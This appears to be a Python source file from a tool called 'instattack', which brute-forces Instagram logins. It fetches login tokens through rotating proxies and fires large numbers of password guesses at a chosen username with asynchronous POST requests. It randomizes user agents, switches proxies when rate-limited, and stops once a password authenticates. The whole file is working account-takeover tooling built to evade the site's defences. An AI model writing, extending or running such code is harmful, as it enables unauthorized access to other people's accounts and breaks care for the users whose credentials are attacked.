from __future__ import absolute_import

import asyncio
import aiohttp
import random
import stopit

from instattack import settings, exceptions
from instattack.progress import OptionalProgressbar
from instattack.handlers import Handler
from instattack.proxies.exceptions import NoProxyError

from .models import InstagramResult, LoginAttemptContext, LoginContext
from .utils import get_token_from_response
from .models import TokenContext
from .exceptions import (
    TokenHandlerException, ResultNotInResponse, TokenNotInResponse,
    InstagramClientApiException, InstagramResultError, TokenHandlerException,
    PasswordHandlerException)


class ResultsHandler(Handler):

    __name__ = 'Results Handler'

    def __init__(self, user, results):
        super(ResultsHandler, self).__init__()

        self.user = user
        self.attempts = asyncio.Queue()
        self.results = results

    async def consume(self, loop, found_result_event):
        """
        Stop event is not needed for the GET case, where we are finding a token,
        because we can trigger the generator to stop by putting None in the queue.
        On the other hand, if we notice that a result is authenticated, we need
        the stop event to stop handlers mid queue.
        """
        index = 0
        with self.log.start_and_done('Consuming Results'):
            # When there are no more passwords, the Password Consumer will put
            # None in the results queue, triggering this loop to break and
            # the stop_event() to stop the Proxy Producer.
            while True:
                result = await self.results.get()
                if result is None:
                    # Triggered by Password Consumer
                    break

                index += 1

                # TODO: Cleanup how we are doing the percent complete operation,
                # maybe try to use progressbar package.
                self.log.notice("{0:.2%}".format(float(index) / self.user.num_passwords))
                self.log.notice(result)

                if result.authorized:
                    self.log.debug('Setting Stop Event')
                    # Notify the Password Consumer to stop - this will also stop
                    # the Proxy Producer.
                    found_result_event.set()
                    break

                else:
                    self.log.error("Not Authenticated", extra={'password': result.context.password})
                    await self.attempts.put(result.context.password)

    async def dump(self, loop):
        attempts_list = []

        with self.log.start_and_done('Dumping Attempts'):
            while not self.attempts.empty():
                attempts_list.append(await self.attempts.get())
            self.user.update_password_attempts(attempts_list)


class RequestHandler(Handler):

    _user_agent = None

    def __init__(
        self,
        method=None,
        session_timeout=None,
        connection_limit=None,
        connection_force_close=None,
        connection_limit_per_host=None,
        connection_keepalive_timeout=None
    ):
        super(RequestHandler, self).__init__(method=method)

        self._connection_limit = connection_limit
        self._session_timeout = session_timeout
        self._connection_force_close = connection_force_close
        self._connection_limit_per_host = connection_limit_per_host
        self._connection_keepalive_timeout = connection_keepalive_timeout

    def _notify_request(self, context, retry=1):
        message = f'Sending {self.__method__} Request'
        if retry != 1:
            message = f'Sending {self.__method__} Request, Retry {retry}'
        self.log.debug(message, extra={'context': context})

    @property
    def user_agent(self):
        if not self._user_agent:
            self._user_agent = random.choice(settings.USER_AGENTS)
        return self._user_agent

    def _headers(self):
        headers = settings.HEADER.copy()
        headers['user-agent'] = self.user_agent
        return headers

    @property
    def _connector(self):
        """
        TCPConnector
        -------------
        keepalive_timeout (float) – timeout for connection reusing after
            releasing
        limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=self._connection_force_close,
            limit=self._connection_limit,
            limit_per_host=self._connection_limit_per_host,
            keepalive_timeout=self._connection_keepalive_timeout,
            enable_cleanup_closed=True,
        )

    @property
    def _timeout(self):
        return aiohttp.ClientTimeout(
            total=self._session_timeout
        )


class TokenHandler(RequestHandler):

    __method__ = 'GET'
    __name__ = 'Token Handler'

    def __init__(
        self,
        proxy_handler,
        token_max_fetch_time=None,
        session_timeout=None,
        connection_limit=None,
        connection_force_close=None,
        connection_limit_per_host=None,
        connection_keepalive_timeout=None
    ):
        super(TokenHandler, self).__init__(
            session_timeout=session_timeout,
            connection_limit=connection_limit,
            connection_force_close=connection_force_close,
            connection_limit_per_host=connection_limit_per_host,
            connection_keepalive_timeout=connection_keepalive_timeout
        )
        self.proxy_handler = proxy_handler
        self._token_max_fetch_time = token_max_fetch_time

    def _get_token_from_response(self, response):
        token = get_token_from_response(response)
        if not token:
            raise TokenNotInResponse()
        return token

    async def fetch(self, session):
        """
        TODO
        ----

        We might want to incorporate handling of a "Too Many Requests" exception
        that is smarter and will notify the handler to use a different proxy and
        note the time.
        """
        async def try_with_proxy(attempt=0):
            self.log.debug('Waiting for Proxy')
            proxy = await self.proxy_handler.get()

            context = TokenContext(index=attempt, proxy=proxy)
            self._notify_request(context, retry=attempt)

            try:
                async with session.get(
                    settings.INSTAGRAM_URL,
                    raise_for_status=True,
                    headers=self._headers(),
                    proxy=proxy.url()
                ) as response:
                    try:
                        token = self._get_token_from_response(response)
                    except TokenNotInResponse as e:
                        self.log.warning(e, extra={'context': context})
                        return await try_with_proxy(attempt=attempt + 1)
                    else:
                        await self.proxy_handler.confirmed(proxy)
                        return token

            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientError as e:
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.CancelledError:
                return

            except (TimeoutError, asyncio.TimeoutError) as e:
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

        # We might have to check if stop_event is set here.
        return await try_with_proxy()

    async def consume(self, loop):
        """
        TODO:
        -----
        Might want to change this method to get_token and the fetch method to
        consume, since the fetch method is really what is consuming the
        proxies.
        """
        try:
            async with aiohttp.ClientSession(
                connector=self._connector,
                timeout=self._timeout
            ) as session:
                with self.log.start_and_done('Finding Token'):
                    task = asyncio.ensure_future(self.fetch(session))

                    with stopit.SignalTimeout(self._token_max_fetch_time) as timeout_mgr:
                        self.log.debug('Waiting for Token Result')
                        token = await task
                        if not token:
                            raise TokenHandlerException("Token should be non-null here.")

                        self.log.debug('Received Token')
                        await self.proxy_handler.stop()
                        return token

                    if timeout_mgr.state == timeout_mgr.TIMED_OUT:
                        raise exceptions.InternalTimeout(
                            self._token_max_fetch_time, "Waiting for token.")
        except NoProxyError:
            raise TokenHandlerException("Not enough allowable proxies to find token.")


class PasswordHandler(RequestHandler):

    __method__ = 'POST'
    __name__ = 'Password Handler'

    def __init__(
        self,
        user,
        proxy_handler,
        session_timeout=None,
        connection_limit=None,
        connection_force_close=None,
        connection_limit_per_host=None,
        connection_keepalive_timeout=None,
    ):
        super(PasswordHandler, self).__init__(
            connection_limit=connection_limit,
            session_timeout=session_timeout,
            connection_force_close=connection_force_close,
            connection_limit_per_host=connection_limit_per_host,
            connection_keepalive_timeout=connection_keepalive_timeout
        )

        self.passwords = asyncio.Queue()
        self.user = user
        self.proxy_handler = proxy_handler

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(PasswordHandler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status >= 400 and response.status < 500:
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            return await self._get_result_from_response(response, context)

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def fetch(self, session, parent_context):
        """
        NOTE
        ----

        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().

        TODO:
        -----

        Maybe incorporate some sort of max-retry on the attempts so that we dont
        accidentally run into a situation of accumulating a lot of requests.

        For certain exceptions we may want to reintroduce the sleep/timeout,
        but it might be faster to immediately just go to next proxy.
        """
        async def try_with_proxy(attempt=0):
            proxy = await self.proxy_handler.get()
            context = LoginAttemptContext(
                index=attempt,
                proxy=proxy,
                parent_index=parent_context.index,
                password=parent_context.password,
                token=parent_context.token
            )
            self._notify_request(context, retry=attempt)

            try:
                async with session.post(
                    settings.INSTAGRAM_LOGIN_URL,
                    headers=self._headers(context.token),
                    proxy=proxy.url(),
                ) as response:
                    # Only reason to log these errors here is to provide the response
                    # object
                    try:
                        result = await self._handle_client_response(response, context)
                        result = await self._handle_parsed_result(result, context)

                    except ResultNotInResponse as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    except InstagramResultError as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    else:
                        if not result:
                            raise PasswordHandlerException("Result should not be None here.")

                        await self.proxy_handler.confirmed(proxy)
                        return result

            except RuntimeError as e:
                """
                RuntimeError: File descriptor 87 is used by transport
                <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
                """
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.TimeoutError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientConnectionError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except OSError as e:
                # We have only seen this for the following:
                # >>> OSError: [Errno 24] Too many open files -> Want to sleep
                # >>> OSError: [Errno 54] Connection reset by peer
                if e.errno == 54:
                    self.log.error(e, extra={'context': context})
                    return await try_with_proxy(attempt=attempt + 1)
                elif e.errno == 24:
                    asyncio.sleep(3)
                    self.log.error(e, extra={
                        'context': context,
                        'other': f'Sleeping for {3} seconds...'
                    })
                    return await try_with_proxy(attempt=attempt + 1)
                else:
                    raise e

            except asyncio.CancelledError as e:
                pass

            except aiohttp.ClientError as e:
                # For whatever reason these errors don't have any message...
                if e.status == 429:
                    e.message = 'Too many requests.'
                    # We still want to put the proxy back in the queue so it can be used
                    # again later, but not confirm it.
                    await self.proxy_handler.used(proxy)

                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

        return await try_with_proxy()

    async def prepopulate(self, loop, password_limit=None):
        with self.log.start_and_done('Prepopulating Passwords'):
            for password in self.user.get_new_attempts(limit=password_limit):
                await self.passwords.put(password)

    async def consume(self, loop, found_result_event, token, results,
            progress=False, password_limit=None):
        """
        A stop event is required since if the results handler notices that we
        found an authenticated result, it needs some way to communicate this to
        the password consumer, since the password consumer will already have
        a series of tasks queued up.

        TODO:
        ----

        If the task_done() callback is not thread safe because of the
        inability to call await self.results.put(result), we might have to go
        back to using asyncio.as_completed() or limited_as_completed():

        for fut in asyncio.as_completed(tasks):
            fut = await fut
            await self.results.put(fut)

        for res in limited_as_completed(task_generator(), self.config.batch_size):
            result = await res
            await self.results.put(result)
        """
        tasks = []
        await self.prepopulate(loop, password_limit=password_limit)

        if self.passwords.qsize() == 0:
            self.log.error('No Passwords to Try')

            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
            await results.put(None)  # Stop Results Consumer
            return

        progress = OptionalProgressbar(label='Attempting Login', max_value=self.passwords.qsize())

        def task_done(fut):
            result = fut.result()
            if not result or not result.conclusive:
                raise PasswordHandlerException("Result should be valid and conslusive.")
            # TODO: Make sure we do not run into any threading issues with this
            # potentially not being thread safe.
            progress.update()
            results.put_nowait(result)

        with self.log.start_and_done('Consuming Passwords'):

            async with aiohttp.ClientSession(
                connector=self._connector,
                timeout=self._timeout
            ) as session:

                index = 0
                while not self.passwords.empty() and not found_result_event.is_set():
                    password = await self.passwords.get()
                    context = LoginContext(index=index, token=token, password=password)

                    task = asyncio.create_task(self.fetch(session, context))
                    task.add_done_callback(task_done)
                    tasks.append(task)

                self.log.debug(f'Awaiting {len(tasks)} Password Tasks...')
                await asyncio.gather(*tasks)

        progress.finish()

        # Triggered by results handler if it notices an authenticated result.
        if found_result_event.is_set():
            # Here we might want to cancel outstanding tasks that we are awaiting.
            self.log.debug('Stop Event Noticed')
            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)

        # Triggered by No More Passwords - No Authenticated Result
        else:
            await results.put(None)  # Stop Results Consumer
            await self.proxy_handler.stop()  # Stop Proxy Handler (Consumer and Broker)
